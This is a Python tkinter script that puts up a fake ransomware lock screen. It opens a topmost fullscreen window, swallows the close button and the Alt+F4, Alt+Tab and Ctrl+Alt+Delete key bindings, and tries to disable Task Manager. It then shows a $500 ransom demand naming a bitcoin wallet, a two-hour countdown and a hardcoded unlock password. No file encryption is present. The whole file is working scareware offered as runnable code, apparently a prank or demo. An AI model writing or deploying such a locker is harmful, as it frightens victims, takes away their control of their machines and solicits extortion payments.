import tkinter as tk
from tkinter import messagebox
import ctypes
import time

def disable_task_manager():
    # Disables Task Manager (Windows Only)
    try:
        ctypes.windll.user32.SystemParametersInfoW(97, 0, 0, 0)
    except:
        pass

def enable_task_manager():
    # Re-enable Task Manager (Windows Only)
    try:
        ctypes.windll.user32.SystemParametersInfoW(97, 1, 0, 0)
    except:
        pass

def close_ransomware_screen(root):
    # Close the window and re-enable Task Manager
    enable_task_manager()
    root.destroy()

def check_password(entry, root):
    # Check if the entered password is correct
    if entry.get() == "kennesaw123":
        close_ransomware_screen(root)

def update_timer(timer_label, end_time, root):
    # Calculate remaining time
    remaining_time = int(end_time - time.time())
    if remaining_time > 0:
        hours, remainder = divmod(remaining_time, 3600)
        minutes, seconds = divmod(remainder, 60)
        timer_label.config(text=f"Time Remaining: {hours:02}:{minutes:02}:{seconds:02}")
        # Call this function again after 1000 ms (1 second)
        root.after(1000, update_timer, timer_label, end_time, root)
    else:
        # Time is up, close the screen
        close_ransomware_screen(root)

def fake_ransomware_screen():
    # Create a full-screen window
    root = tk.Tk()
    root.title("Ransomware")
    root.attributes("-fullscreen", True)
    root.configure(background="black")

    # Disable close, minimize, and maximize buttons
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Ransom message
    message = """Your files have been encrypted!\n
    To get the decryption key, you must pay $500.\n
    Failure to do so will result in permanent data loss.\n
    Time left: 2 hours\n\n\n\n\nSend $$$ to the following bitcoin wallet --bc1qwrglfqj0vf68y3zfuytga76ehh0e4yv2y63w5t--"""
    
    label = tk.Label(root, text=message, fg="red", bg="black", font=("Helvetica", 24))
    label.pack(expand=True)

    # Timer label (will be updated every second)
    timer_label = tk.Label(root, text="", fg="red", bg="black", font=("Helvetica", 24))
    timer_label.pack(expand=True)

    password_label = tk.Label(root, text="Enter Decryption Password:", fg="white", bg="black", font=("Helvetica", 18))
    password_label.pack(pady=10)

    password_entry = tk.Entry(root, show="*", font=("Helvetica", 18))
    password_entry.pack(pady=10)

    password_entry.bind("<Return>", lambda event: check_password(password_entry, root))

    root.bind("<Alt_L><F4>", lambda e: "break")
    root.bind("<Alt_L><Tab>", lambda e: "break")
    root.bind("<Control_L><Alt_L><Delete>", lambda e: "break")
    
    disable_task_manager()

    root.attributes("-topmost", True)

    # Calculate the end time (current time + 2 hours)
    end_time = time.time() + 2 * 3600

    # Start updating the timer
    update_timer(timer_label, end_time, root)

    root.mainloop()

if __name__ == "__main__":
    fake_ransomware_screen()
